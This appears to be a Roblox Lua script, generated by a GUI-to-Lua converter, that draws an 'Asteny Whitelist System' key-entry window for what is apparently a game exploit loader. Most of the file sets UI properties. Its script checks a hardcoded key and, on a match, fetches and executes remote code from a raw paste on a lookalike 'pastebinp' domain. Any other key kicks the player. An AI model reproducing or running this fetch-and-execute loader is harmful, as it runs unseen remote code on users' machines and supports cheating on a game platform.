-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local TextBox_Roundify_12px = Instance.new("ImageLabel")
local key = Instance.new("TextBox")
local submit = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Name = "Frame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.322399229, 0, 0.338645428, 0)
Frame.Size = UDim2.new(0, 379, 0, 161)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(38, 38, 38)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.034300793, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 353, 0, 34)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Asteny Whitelist System"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 16.000

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.234828502, 0, 0.391304344, 0)
TextBox.Size = UDim2.new(0, 200, 0, 42)
TextBox.Font = Enum.Font.Cartoon
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000

TextBox_Roundify_12px.Name = "TextBox_Roundify_12px"
TextBox_Roundify_12px.Parent = TextBox
TextBox_Roundify_12px.Active = true
TextBox_Roundify_12px.AnchorPoint = Vector2.new(0.5, 0.5)
TextBox_Roundify_12px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox_Roundify_12px.BackgroundTransparency = 1.000
TextBox_Roundify_12px.Position = UDim2.new(0.5, 0, 0.40476191, 0)
TextBox_Roundify_12px.Selectable = true
TextBox_Roundify_12px.Size = UDim2.new(1, 0, 1, 0)
TextBox_Roundify_12px.Image = "rbxassetid://3570695787"
TextBox_Roundify_12px.ImageColor3 = Color3.fromRGB(48, 48, 48)
TextBox_Roundify_12px.ScaleType = Enum.ScaleType.Slice
TextBox_Roundify_12px.SliceCenter = Rect.new(100, 100, 100, 100)
TextBox_Roundify_12px.SliceScale = 0.120

key.Name = "key"
key.Parent = TextBox
key.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
key.BackgroundTransparency = 1.000
key.BorderSizePixel = 0
key.Position = UDim2.new(0.0299999993, 0, -0.095238097, 0)
key.Size = UDim2.new(0, 187, 0, 42)
key.Font = Enum.Font.Cartoon
key.Text = ""
key.TextColor3 = Color3.fromRGB(255, 255, 255)
key.TextSize = 14.000

submit.Name = "submit"
submit.Parent = Frame
submit.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
submit.BorderSizePixel = 0
submit.Position = UDim2.new(0.234828502, 0, 0.70807457, 0)
submit.Size = UDim2.new(0, 200, 0, 36)
submit.Font = Enum.Font.Cartoon
submit.Text = "Submit"
submit.TextColor3 = Color3.fromRGB(255, 255, 255)
submit.TextSize = 16.000

-- Scripts:

local function ILHO_fake_script() -- ScreenGui.LocalScript 
	local script = Instance.new('LocalScript', ScreenGui)

	local Frame = script.Parent.Frame
	local textbox = script.Parent.Frame.TextBox
	local key = script.Parent.Frame.TextBox.key
	local submit = script.Parent.Frame.submit
	local plr = game.Players.LocalPlayer
	
	submit.MouseButton1Down:Connect(function()
		if key.Text == "mami" then
			loadstring(game:HttpGet("https://pastebinp.com/raw/J1D2mf8W"))()
			Frame.Visible = false
		else
			plr:Kick("Not Whitelisted!")
		end
	end)
end
coroutine.wrap(ILHO_fake_script)()
